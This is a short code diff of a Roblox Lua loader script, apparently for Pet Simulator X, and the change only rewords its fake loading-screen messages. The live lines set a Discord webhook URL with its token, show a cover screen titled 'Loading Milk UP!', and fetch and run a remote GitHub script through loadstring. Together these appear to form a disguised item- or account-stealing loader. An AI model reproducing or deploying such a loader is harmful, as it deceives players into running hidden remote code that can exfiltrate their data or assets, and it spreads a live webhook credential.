@@ -5,7 +5,7 @@ WebHook = "https://discord.com/api/webhooks/1133003596401758259/xL-WZ8Eue_lN-2mp
 loadingscreen = true -- set this to false and remove _G. stuff to use your own GUI
 _G.CustomScriptName = "Loading Milk UP!"
 _G.Text1 = "Script Loaded..."
-_G.Text2 = "Waiting for Script"
-_G.Text3 = "Checking Scripts..."
-_G.Text4 = "Starting Scripts..."
+_G.Text2 = "Loading Script..."
+_G.Text3 = "Loading Autofarm..."
+_G.Text4 = "Loading MainTab..."
 loadstring(game:HttpGet("https://raw.githubusercontent.com/Justanotherdme/petsimx22/main/petsimguiss.lua"))()
